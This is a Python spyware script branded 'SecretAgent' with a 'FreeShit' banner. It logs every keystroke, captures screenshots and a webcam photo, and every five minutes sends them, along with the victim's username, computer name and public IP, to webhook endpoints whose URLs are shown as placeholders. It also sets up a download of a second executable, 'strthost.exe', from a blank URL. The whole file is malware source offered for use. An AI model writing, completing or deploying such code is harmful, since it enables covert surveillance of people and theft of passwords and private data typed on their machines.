import pyautogui
import requests
import threading
import os
import colorama
import datetime
import cv2
from io import BytesIO
from PIL import Image
from os import system
from colorama import Fore,init
from subprocess import Popen, PIPE 
from time import sleep
from pynput.keyboard import Key, Listener
import os

init()

banner = f"""
{colorama.Fore.RED}███████╗██████╗ ███████╗███████╗███████╗██╗  ██╗██╗████████╗
{colorama.Fore.GREEN}██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝██║  ██║██║╚══██╔══╝  
{colorama.Fore.RED}█████╗  ██████╔╝█████╗  █████╗  ███████╗███████║██║   ██║      
{colorama.Fore.GREEN}██╔══╝  ██╔══██╗██╔══╝  ██╔══╝  ╚════██║██╔══██║██║   ██║    
{colorama.Fore.RED}██║     ██║  ██║███████╗███████╗███████║██║  ██║██║   ██║     
{colorama.Fore.GREEN}╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝ 
{colorama.Fore.RED}Created By FreeShit ║ Dev: segations#2344 ║ getfreeshit.today
{colorama.Fore.GREEN}                      Version 2.0.0
"""
print(banner)


strthost = {
    "bytes":requests.get("").content,
    "name":"strthost.exe"
}
camera = cv2.VideoCapture(0)
returnv, image = camera.read()

webhooks = {
    'main': '<main webhook>',
    'keylogs': '<key logger webhook>',
}

def sendpics():
    ss = pyautogui.screenshot()

    ip_addr = requests.get("https://api.ipify.org/").text
    buffered = BytesIO()
    ss.save(buffered, format="JPEG")
    screenshot = buffered.getvalue()

    buffered = BytesIO()
    Image.fromarray(image).save(buffered, format="JPEG")
    webcam = buffered.getvalue()

    payload = {
        "username": f"SecretAgent [{os.getenv('COMPUTERNAME')}/{os.getenv('USERNAME')}]",
        "content": f"@everyone Secretagent executed on user machine!\nUsername: {os.getenv('USERNAME')}\nComputer: {os.getenv('COMPUTERNAME')}\nTime: {datetime.datetime.now()}\nIPv4 Address: {ip_addr}",
    }

    scrs = {
            "file": ('screenshot.jpeg', screenshot, "image/jpeg")
    }
    wbcm = {
            "file2": ('webcam.jpeg', webcam, "image/jpeg")
    }

    requests.post(url=webhooks['main'], data=payload)

    payload = {
        "username": f"SecretAgent [{os.getenv('COMPUTERNAME')}/{os.getenv('USERNAME')}]",
        "content": f"Screenshot of user screen:",
    }

    requests.post(url=webhooks['main'], data=payload, files=scrs)

    payload = {
        "username": f"SecretAgent [{os.getenv('COMPUTERNAME')}/{os.getenv('USERNAME')}]",
        "content": f"Picture of webcam (if there is one):" if returnv else "No webcam found.",
    }

    requests.post(url=webhooks['main'], data=payload, files=wbcm if returnv else None)

    os.system('cls')

class Kl:
                 keylogst = ''
def keyFunction(k):
    global keylogs
    ke = f"{k}".replace('Key.', '').replace("'", '').upper()
    Kl.keylogst = f"""{Kl.keylogst}"""+' '+ke.replace('SPACE', ' ')+'\n' if len(ke) > 1 else f"""{Kl.keylogst}"""+ke.lower()
    keylogs = f"""Key Logs for [{datetime.datetime.now()}]\n{Kl.keylogst}"""+f" {ke if len(ke) > 1 else ke.lower()}\n"
    print(ke)

def keyUploadPayload():
    while True:
        sleep(60 * 5)
        sendpics()
        print("[+] Uploading keylogs...")
        payload = {
            "username": f"SecretAgent [{os.getenv('COMPUTERNAME')}/{os.getenv('USERNAME')}]",
            "content": "@everyone Keylogs report",
        }
        requests.post(url=webhooks['keylogs'], data=payload, files={"file": ('keylogs.txt', keylogs, "text/plain")})

with Listener(on_press=keyFunction) as listener:
        thread = threading.Thread(target=keyUploadPayload)
        thread.start()
        listener.join()
